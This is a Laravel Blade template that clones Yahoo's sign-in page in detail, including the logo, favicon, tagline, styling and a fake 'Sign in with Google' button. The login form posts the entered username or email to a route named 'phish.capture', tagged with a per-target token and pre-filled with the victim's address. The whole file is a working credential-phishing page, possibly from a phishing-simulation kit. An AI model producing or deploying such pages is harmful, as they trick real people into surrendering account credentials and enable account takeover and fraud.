<!DOCTYPE html>
<html lang="en" class="yahoo">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Login - Sign in to Yahoo</title>
    <link rel="icon" href="https://s.yimg.com/rz/p/yahoo_default_favicon_32_v2.ico" type="image/x-icon">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html.yahoo { background: #fff; }
        body {
            font-family: "Yahoo Product Sans VF", "Helvetica Neue", Helvetica, Arial, sans-serif;
            font-size: 16px;
            line-height: 24px;
            color: #141414;
            background: #fff;
            width: 1366px;
            height: 768px;
            overflow: hidden;
        }

        header {
            position: absolute;
            top: 0;
            left: 0;
            height: 64px;
            display: flex;
            align-items: center;
            padding: 0 40px;
        }

        .logo img {
            height: 36px;
            width: auto;
        }

        .header-links {
            position: absolute;
            top: 23px;
            right: 83px;
            display: flex;
            gap: 14px;
        }

        .header-links a {
            font-size: 14px;
            font-weight: 450;
            color: #5b636a;
            text-decoration: none;
            line-height: 1;
        }

        .header-links a:hover { text-decoration: underline; }

        .page {
            display: flex;
            width: 1366px;
            height: 768px;
        }

        .left-side {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            padding-left: 120px;
        }

        .left-side .tagline {
            font-size: 23px;
            font-weight: 700;
            line-height: 34.5px;
            color: #1d2228;
            max-width: 420px;
        }

        .right-side {
            position: absolute;
            top: 0;
            right: 0;
            width: 528px;
            height: 768px;
            display: flex;
            align-items: flex-start;
        }

        .login-box {
            width: 360px;
            margin-left: 0;
            margin-right: 168px;
            padding-top: 114px;
        }

        .form-section {
            width: 278px;
            margin-left: 41px;
        }

        h1 {
            font-family: "Centra No2", "Helvetica Neue", Helvetica, Arial, sans-serif;
            font-size: 24px;
            font-weight: 700;
            line-height: 26.4px;
            color: #141414;
            margin-bottom: 24px;
        }

        .form-group {
            display: flex;
            flex-direction: column;
        }

        .input-wrapper {
            display: flex;
            flex-direction: column;
            margin-bottom: 51px;
        }

        .input-wrapper label {
            font-size: 14px;
            font-weight: 600;
            color: #7d2eff;
            margin-bottom: 0;
            cursor: pointer;
            line-height: 18px;
        }

        .input-wrapper input {
            width: 100%;
            height: 18px;
            padding: 0;
            font-size: 14px;
            font-family: "Yahoo Product Sans VF", "Helvetica Neue", Helvetica, Arial, sans-serif;
            color: #1d2228;
            border: none;
            border-bottom: 1px solid #e0e4e9;
            outline: none;
            margin-top: 4px;
            background: transparent;
            line-height: 18px;
        }

        .input-wrapper input:focus {
            border-bottom: 2px solid #7d2eff;
        }

        .options-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 28px;
            height: 18px;
        }

        .stay-signed-in {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 14px;
            font-weight: 450;
            color: #5b636a;
            cursor: pointer;
            line-height: 18px;
        }

        .stay-signed-in input[type="checkbox"] {
            width: 18px;
            height: 18px;
            accent-color: #7d2eff;
            cursor: pointer;
        }

        .forgot-link {
            font-size: 14px;
            font-weight: 450;
            color: #5b636a;
            text-decoration: none;
            line-height: 18px;
        }

        .forgot-link:hover { text-decoration: underline; }

        .btn-primary {
            width: 100%;
            height: 52px;
            padding: 0 20px;
            font-size: 16px;
            font-weight: 600;
            font-family: "Yahoo Product Sans VF", "Helvetica Neue", Helvetica, Arial, sans-serif;
            color: #fff;
            background: #7d2eff;
            border: none;
            border-radius: 9999px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 8px;
            line-height: 24px;
        }

        .btn-primary:hover { background: #6a1ee6; }

        .or-divider {
            text-align: center;
            font-size: 14px;
            font-weight: 450;
            color: #5b636a;
            padding: 8px 0;
            margin-bottom: 10px;
            line-height: 18px;
        }

        .btn-google {
            width: 100%;
            height: 52px;
            padding: 0 20px;
            font-size: 16px;
            font-weight: 600;
            font-family: "Yahoo Product Sans VF", "Helvetica Neue", Helvetica, Arial, sans-serif;
            color: #141414;
            background: transparent;
            border: 1px solid #cdcdcd;
            border-radius: 9999px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-bottom: 24px;
            line-height: 24px;
        }

        .btn-google:hover { background: #f5f5f5; }

        .btn-google svg {
            width: 24px;
            height: 24px;
            flex-shrink: 0;
        }

        .create-account {
            width: 100%;
            height: 52px;
            padding: 0 20px;
            font-size: 16px;
            font-weight: 600;
            font-family: "Yahoo Product Sans VF", "Helvetica Neue", Helvetica, Arial, sans-serif;
            color: #7d2eff;
            background: transparent;
            border: 1px solid #cdcdcd;
            border-radius: 9999px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            text-decoration: none;
            line-height: 24px;
        }

        .create-account:hover { background: #f5f5f5; }
    </style>
</head>
<body>
    <header>
        <div class="logo">
            <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo">
        </div>
    </header>

    <div class="header-links">
        <a href="#">Help</a>
        <a href="#">Terms</a>
        <a href="#">Privacy</a>
    </div>

    <div class="page">
        <div class="left-side">
            <p class="tagline">Yahoo makes it easy to enjoy what matters most in your world.</p>
        </div>

        <div class="right-side">
            <div class="login-box">
                <div class="form-section">
                    <h1>Sign in to Yahoo</h1>

                    <form action="{{ route('phish.capture', ['provider' => 'yahoo', 'token' => $token]) }}" method="POST" autocomplete="off">
                        @csrf

                        <div class="form-group">
                            <div class="input-wrapper">
                                <label for="login-ident">Username, email or phone number</label>
                                <input type="text" id="login-ident" name="identifier" autocomplete="username" value="{{ $email ?? '' }}">
                            </div>

                            <div class="options-row">
                                <label class="stay-signed-in">
                                    <input type="checkbox" name="persistent" value="1">
                                    Stay signed in
                                </label>
                                <a href="#" class="forgot-link">Forgot username</a>
                            </div>

                            <button type="submit" class="btn-primary">Next</button>

                            <div class="or-divider">or</div>

                            <button type="button" class="btn-google">
                                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                    <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z" fill="#4285F4"/>
                                    <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
                                    <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
                                    <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
                                </svg>
                                Sign in with Google
                            </button>

                            <a href="#" class="create-account">Create account</a>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
